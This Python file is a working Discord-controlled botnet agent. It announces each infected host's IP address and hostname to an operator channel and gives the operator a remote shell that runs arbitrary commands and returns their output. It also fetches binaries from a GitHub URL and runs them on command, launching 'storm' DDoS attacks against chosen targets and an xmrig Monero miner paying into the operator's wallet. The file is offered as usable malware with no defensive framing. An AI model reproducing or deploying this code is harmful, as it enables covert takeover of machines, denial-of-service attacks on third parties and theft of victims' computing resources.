from discord.ext import commands
import requests, discord, urllib, psutil, socket, sys, os

token = 'MToken.mnt.discord' # Token
channel_id = 111111111111111111  # Channel ID

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

# client
ip = requests.get('https://sheesh.rip/ip').headers['IP']
hostname = socket.gethostname()
os.chdir("/tmp")

# login
@bot.event
async def on_ready():
    channel = bot.get_channel(channel_id)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    print(f'{bot.user}')
    await channel.send(f"``[+] {ip}@{hostname}: Session opened``")
    

# ----- Commands ----- #

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``[*] {ip}@{hostname}``")
    
# shell
@bot.command(name=f"shell.{hostname}@{ip}")
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    
    if sys.getsizeof(output) > 2000:
        await ctx.send(f"``[+] {ip}@{hostname}: Command executed``")
    else:
        await ctx.send(f"``[+] {ip}@{hostname}: Command executed`` ```{output}```")
    
# check
@bot.command()
async def check(ctx):
    if "xmrig" in (i.name() for i in psutil.process_iter()):
        await ctx.send(f"``[+] {ip}@{hostname}: Miner running``")
    else:
        await ctx.send(f"``[-] {ip}@{hostname}: Miner not running``")
    
    if "storm" in (i.name() for i in psutil.process_iter()):
        await ctx.send(f"``[+] {ip}@{hostname}: DDoS running``")
    else:
        await ctx.send(f"``[-] {ip}@{hostname}: DDoS not running``")
    
# ddos
@bot.command()
async def ddos(ctx, ddosarg):
    if not os.path.exists("storm"):
        url = "https://github.com/rxu7s/Public/raw/main/storm"
        r = requests.get(url, allow_redirects=True)
        open("storm", 'wb').write(r.content)
    
    ddosip = ''.join(ddosarg)
    os.popen(f"chmod 777 storm; ./storm -d {ddosip}")
    await ctx.send(f"``[+] {ip}@{hostname}: DDoS started to {ddosip}``")
    
# stop ddos
@bot.command()
async def stopddos(ctx):
    if "storm" in (i.name() for i in psutil.process_iter()):
        os.popen("pkill storm")
        await ctx.send(f"``[-] {ip}@{hostname}: DDoS stoped``")
    
# miner
@bot.command()
async def miner(ctx, walletArg):
    if not os.path.exists("xmrig"):
        url = "https://github.com/rxu7s/Public/raw/main/xmrig"
        r = requests.get(url, allow_redirects=True)
        open("xmrig", 'wb').write(r.content)
    
    wallet = ''.join(walletArg)
    os.popen(f"chmod 777 xmrig; ./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
    await ctx.send(f"``[+] {ip}@{hostname}: Miner started``")
    
# stop miner
@bot.command()
async def stopminer(ctx):
    if "xmrig" in (i.name() for i in psutil.process_iter()):
        os.popen("pkill xmrig")
        await ctx.send(f"``[-] {ip}@{hostname}: Miner stoped``")
    

bot.run(token)